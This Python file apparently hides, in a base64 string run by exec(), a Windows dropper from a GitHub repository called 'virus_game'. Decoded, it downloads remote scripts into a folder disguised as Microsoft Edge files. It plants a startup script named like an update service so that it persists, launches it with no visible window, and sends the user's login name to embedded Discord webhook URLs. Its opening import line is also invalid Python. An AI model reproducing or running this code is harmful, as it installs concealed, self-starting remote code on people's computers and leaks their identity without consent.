import base64.decodebytes; exec(base64.decodebytes('''aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHN1YnByb2Nlc3MKUFlUSE9OX0NPTU1BTkQgPSBzeXMuZXhlY3V0YWJsZQppbnN0YWxsX2RlcGVkZW5jaWVzID0gaW5wdXQoIkluc3RhbGwgbWlzc2luZyBkZXBlZGVuY2llcyBpZiBmb3VuZD8gKHkvbikgPj4gIikgPT0gInkiCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQ6CiAgICBpZiBub3QgaW5zdGFsbF9kZXBlZGVuY2llczoKICAgICAgICBwcmludCgiJ3JlcXVlc3RzJyBsaWJyYXJ5IGlzIHJlcXVpcmVkLCBidXQgbm90IGZvdW5kLiBZb3UgY2FuIGluc3RhbGwgaXQgdXNpbmcgJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyIpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIHByaW50KCIncmVxdWVzdHMnIGxpYnJhcnkgbm90IGZvdW5kLiBJbnN0YWxsaW5nIHJlcXVlc3RzIHVzaW5nIHBpcC4uLiIpCiAgICBzdWJwcm9jZXNzLmNoZWNrX2NhbGwoW1BZVEhPTl9DT01NQU5ELCAiLW0iLCAicGlwIiwgImluc3RhbGwiLCAicmVxdWVzdHMiXSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgIHN1YnByb2Nlc3MuY2hlY2tfY2FsbChbUFlUSE9OX0NPTU1BTkQsIF9fZmlsZV9fXSkKICAgIGV4aXQoMCkKCiMgRnVsbHkgZ2VuZXJhdGVkIGJ5IEdlbWluaQoKCgpkZWYgbG9nX3RvX2Rpc2NvcmQobXNnOnN0ciwgaW1wb3J0YW50PUZhbHNlKToKICAgICIiIlNlbmRzIGEgbG9nIG1lc3NhZ2UgdG8gYSBEaXNjb3JkIHdlYmhvb2suIiIiCiAgICAjIFRoaXMgd2ViaG9vayBVUkwgaXMgZnJvbSB5b3VyIG90aGVyIHNjcmlwdHMuCiAgICAjIEl0J3MgaW5jbHVkZWQgaGVyZSB0byBtYWludGFpbiB0aGUgbG9nZ2luZyBmdW5jdGlvbmFsaXR5IGR1cmluZyBpbnN0YWxsYXRpb24uCiAgICB3ZWJob29rX3VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDMzODA1MTE5MDQ4MTIyMzc4L3RpNmFEcVVMM0NpSjRTVlVXREx3dzFlZjQ5U3hWbWFNc0RLNFR2ZDh6WDlvamh4bVVrSl9pU2FTUGRXdEtzVk84MkFNIgogICAgaW1wb3J0YW50X3dlYmhvb2tfdXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0MzQ1NjY5MDMwMTk2MDYxMjcvLWEwdU9DNE9XdUp4N3FwUFdiSUFGN1BkWVNHSFFLUXFsRmR1OGxjdk5CU3EyTjlLSFVyLXFqSmdDank5Z2wwdzFCZlQiCiAgICAKICAgIGRhdGEgPSB7InVzZXJuYW1lIjogZiJJbnN0YWxsZXI6e29zLmdldGxvZ2luKCl9IiwgImNvbnRlbnQiOiBtc2d9CiAgICB0cnk6CiAgICAgICAgcmVxdWVzdHMucG9zdCh3ZWJob29rX3VybCwganNvbj1kYXRhKQogICAgICAgIGlmIGltcG9ydGFudDoKICAgICAgICAgICAgcmVxdWVzdHMucG9zdChpbXBvcnRhbnRfd2ViaG9va191cmwsIGpzb249ZGF0YSkKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkZhaWxlZCB0byBzZW5kIGxvZyBtZXNzYWdlOiB7ZX0iKQoKZGVmIGluc3RhbGxfZGVwZW5kZW5jaWVzKHJlcXVpcmVtZW50c19wYXRoKToKICAgICIiIkluc3RhbGxzIHJlcXVpcmVkIFB5dGhvbiBwYWNrYWdlcyB1c2luZyBwaXAuIiIiCiAgICBwcmludCgiSW5zdGFsbGluZyByZXF1aXJlZCBkZXBlbmRlbmNpZXMuLi4iKQogICAgbG9nX3RvX2Rpc2NvcmQoIkluc3RhbGxpbmcgZGVwZW5kZW5jaWVzLi4uIiwgaW1wb3J0YW50PVRydWUpCiAgICB0cnk6CiAgICAgICAgc3VicHJvY2Vzcy5jaGVja19jYWxsKFtQWVRIT05fQ09NTUFORCwgIi1tIiwgInBpcCIsICJpbnN0YWxsIiwgIi1yIiwgcmVxdWlyZW1lbnRzX3BhdGhdLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIGxvZ190b19kaXNjb3JkKCJTdWNjZXNzZnVsbHkgaW5zdGFsbGVkIGRlcGVuZGVuY2llcyBmcm9tIGByZXF1aXJlbWVudHMudHh0YC4iKQogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yOgogICAgICAgIHByaW50KCJGYWlsZWQgdG8gaW5zdGFsbCBkZXBlbmRlbmNpZXMgZnJvbSByZXF1aXJlbWVudHMudHh0LiIpCiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnN1cmUgcGlwIGlzIGluc3RhbGxlZCBhbmQgeW91IGhhdmUgYW4gaW50ZXJuZXQgY29ubmVjdGlvbi4iKQogICAgICAgIGxvZ190b19kaXNjb3JkKCIqKkVSUk9SKio6IEZhaWxlZCB0byBpbnN0YWxsIGRlcGVuZGVuY2llcyBmcm9tIGByZXF1aXJlbWVudHMudHh0YC4iLCBpbXBvcnRhbnQ9VHJ1ZSkKICAgICAgICBzeXMuZXhpdCgxKQogICAgcHJpbnQoIkFsbCBkZXBlbmRlbmNpZXMgaW5zdGFsbGVkLiIpCgpkZWYgZG93bmxvYWRfZmlsZSh1cmwsIGRlc3RpbmF0aW9uKToKICAgICIiIkRvd25sb2FkcyBhIGZpbGUgZnJvbSBhIFVSTCB0byBhIGRlc3RpbmF0aW9uIHBhdGguIiIiCiAgICB0cnk6CiAgICAgICAgcHJpbnQoZiJEb3dubG9hZGluZyB7b3MucGF0aC5iYXNlbmFtZShkZXN0aW5hdGlvbil9IGZyb20ge3VybH0uLi4iKQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgc3RyZWFtPVRydWUpCiAgICAgICAgcmVzcG9uc2UucmFpc2VfZm9yX3N0YXR1cygpICAjIFJhaXNlIGFuIGV4Y2VwdGlvbiBmb3IgYmFkIHN0YXR1cyBjb2RlcwogICAgICAgIAogICAgICAgIG9zLm1ha2VkaXJzKG9zLnBhdGguZGlybmFtZShkZXN0aW5hdGlvbiksIGV4aXN0X29rPVRydWUpCiAgICAgICAgCiAgICAgICAgd2l0aCBvcGVuKGRlc3RpbmF0aW9uLCAid2IiKSBhcyBmOgogICAgICAgICAgICBmb3IgY2h1bmsgaW4gcmVzcG9uc2UuaXRlcl9jb250ZW50KGNodW5rX3NpemU9ODE5Mik6CiAgICAgICAgICAgICAgICBmLndyaXRlKGNodW5rKQogICAgICAgIHByaW50KGYiU3VjY2Vzc2Z1bGx5IGRvd25sb2FkZWQgdG8ge2Rlc3RpbmF0aW9ufSIpCiAgICAgICAgbG9nX3RvX2Rpc2NvcmQoZiJEb3dubG9hZGVkIGB7b3MucGF0aC5iYXNlbmFtZShkZXN0aW5hdGlvbil9YC4iKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgZG93bmxvYWRpbmcge3VybH06IHtlfSIpCiAgICAgICAgbG9nX3RvX2Rpc2NvcmQoZiIqKkVSUk9SKio6IEZhaWxlZCB0byBkb3dubG9hZCBge29zLnBhdGguYmFzZW5hbWUoZGVzdGluYXRpb24pfWA6IHtlfSIpCiAgICAgICAgc3lzLmV4aXQoMSkKCmRlZiBtYWluKCk6CiAgICAiIiJNYWluIGZ1bmN0aW9uIHRvIHJ1biB0aGUgb25saW5lIGluc3RhbGxlci4iIiIKICAgIGlmIHN5cy5wbGF0Zm9ybSAhPSAid2luMzIiOgogICAgICAgIHByaW50KCJUaGlzIHByb2dyYW0gaXMgaW50ZW5kZWQgZm9yIFdpbmRvd3Mgb25seS4gRXhpdGluZy4iKQogICAgICAgIHN5cy5leGl0KDEpCgogICAgbG9nX3RvX2Rpc2NvcmQoIioqU3RhcnRpbmcgb25saW5lIGluc3RhbGxhdGlvbiBvZiB2Mi4uLioqIiwgaW1wb3J0YW50PVRydWUpCgogICAgaG9tZV9kaXIgPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKQogICAgc2hlbGxfc3RhcnR1cF9kaXIgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnQVBQREFUQSddLCAnTWljcm9zb2Z0JywgJ1dpbmRvd3MnLCAnU3RhcnQgTWVudScsICdQcm9ncmFtcycsICdTdGFydHVwJykKICAgIHZpcnVzX2RpciA9IG9zLnBhdGguam9pbihob21lX2RpciwgIi50ZW1wIiwgIk1pY3Jvc29mdF9FZGdlX3g2NCIsICJ1dGlscyIpCgogICAgcmVwb19iYXNlX3VybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSGFjYXJpYy92aXJ1c19nYW1lL21haW4vdjIvIgoKICAgIGlmIGluc3RhbGxfZGVwZWRlbmNpZXM6CiAgICAgICAgIyBEb3dubG9hZCBkZXBlbmRlbmNpZXMgZmlsZSBhbmQgaW5zdGFsbCBwYWNrYWdlcwogICAgICAgIGRlcGVuZGVuY2llc191cmwgPSBmIntyZXBvX2Jhc2VfdXJsfWRlcGVuZGVuY2llcy50eHQiCiAgICAgICAgIyBQbGFjZSBpdCBpbiBhIHRlbXBvcmFyeSBidXQgd3JpdGFibGUgbG9jYXRpb24KICAgICAgICB0ZW1wX2RpciA9IG9zLmVudmlyb24uZ2V0KCJURU1QIiwgb3MucGF0aC5qb2luKGhvbWVfZGlyLCAiLnRlbXAiKSkKICAgICAgICBkZXBlbmRlbmNpZXNfcGF0aCA9IG9zLnBhdGguam9pbih0ZW1wX2RpciwgInYyX3JlcXVpcmVtZW50cy50eHQiKQogICAgICAgIGRvd25sb2FkX2ZpbGUoZGVwZW5kZW5jaWVzX3VybCwgZGVwZW5kZW5jaWVzX3BhdGgpCiAgICAgICAgaW5zdGFsbF9kZXBlbmRlbmNpZXMoZGVwZW5kZW5jaWVzX3BhdGgpCgogICAgIyBEZWZpbmVzIHdoaWNoIGZpbGVzIHRvIGRvd25sb2FkIGFuZCB3aGVyZSB0byBwbGFjZSB0aGVtCiAgICBmaWxlc190b19pbnN0YWxsID0gWwogICAgICAgIChmIntyZXBvX2Jhc2VfdXJsfWdhbWFfYWFhLnB5Iiwgb3MucGF0aC5qb2luKHZpcnVzX2RpciwgImNsZWFudXBfeDY0LnB5IikpLAogICAgICAgIChmIntyZXBvX2Jhc2VfdXJsfWZpbGVfY2hlY2tlci5weSIsIG9zLnBhdGguam9pbih2aXJ1c19kaXIsICJjbGVhbmVyX3gzMi5weSIpKSwKICAgICAgICAoZiJ7cmVwb19iYXNlX3VybH1zdGFydHVwLnB5Iiwgb3MucGF0aC5qb2luKHNoZWxsX3N0YXJ0dXBfZGlyLCAicHl0aG9uX2V4ZWN1dGFibGVfdXBkYXRlX3NlcnZpY2UucHkiKSksCiAgICAgICAgKGYie3JlcG9fYmFzZV91cmx9eW91dHViZV9jb20td2F0Y2gtZFF3NHc5V2dYY1EubXAzIiwgb3MucGF0aC5qb2luKHZpcnVzX2RpciwgInlvdXR1YmVfY29tLXdhdGNoLWRRdzR3OVdnWGNRLm1wMyIpKSwKICAgIF0KCiAgICBwcmludCgiXG5Eb3dubG9hZGluZyBhbmQgcGxhY2luZyBwcm9ncmFtIGZpbGVzLi4uIikKICAgIGZvciB1cmwsIGRlc3RpbmF0aW9uIGluIGZpbGVzX3RvX2luc3RhbGw6CiAgICAgICAgZG93bmxvYWRfZmlsZSh1cmwsIGRlc3RpbmF0aW9uKQoKICAgIGxvZ190b19kaXNjb3JkKCJJbnN0YWxsYXRpb24gY29tcGxldGUuIFN0YXJ0aW5nIHByb2dyYW0uIikKICAgIHByaW50KCJcbkluc3RhbGxhdGlvbiBjb21wbGV0ZS4gU3RhcnRpbmcgcHJvZ3JhbS4uLiIpCgogICAgIyBTdGFydCB0aGUgcHJvZ3JhbSB2aWEgdGhlIHN0YXJ0dXAgc2NyaXB0CiAgICBzdGFydHVwX3NjcmlwdF9wYXRoID0gb3MucGF0aC5qb2luKHNoZWxsX3N0YXJ0dXBfZGlyLCAicHl0aG9uX2V4ZWN1dGFibGVfdXBkYXRlX3NlcnZpY2UucHkiKQogICAgdHJ5OgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oW1BZVEhPTl9DT01NQU5ELCBzdGFydHVwX3NjcmlwdF9wYXRoXSwgY3JlYXRpb25mbGFncz1zdWJwcm9jZXNzLkNSRUFURV9OT19XSU5ET1cpCiAgICAgICAgcHJpbnQoIlByb2dyYW0gc3RhcnRlZCBzdWNjZXNzZnVsbHkgaW4gdGhlIGJhY2tncm91bmQuIikKICAgICAgICBwcmludCgiVGhlIGluc3RhbGxlciB3aWxsIG5vdyBleGl0LiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJGYWlsZWQgdG8gc3RhcnQgdGhlIHByb2dyYW06IHtlfSIpCiAgICAgICAgbG9nX3RvX2Rpc2NvcmQoZiIqKkZBVEFMKio6IEZhaWxlZCB0byBsYXVuY2ggc3RhcnR1cCBzY3JpcHQ6IHtlfSIsIGltcG9ydGFudD1UcnVlKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo='''.encode('utf-8')).decode('utf-8'))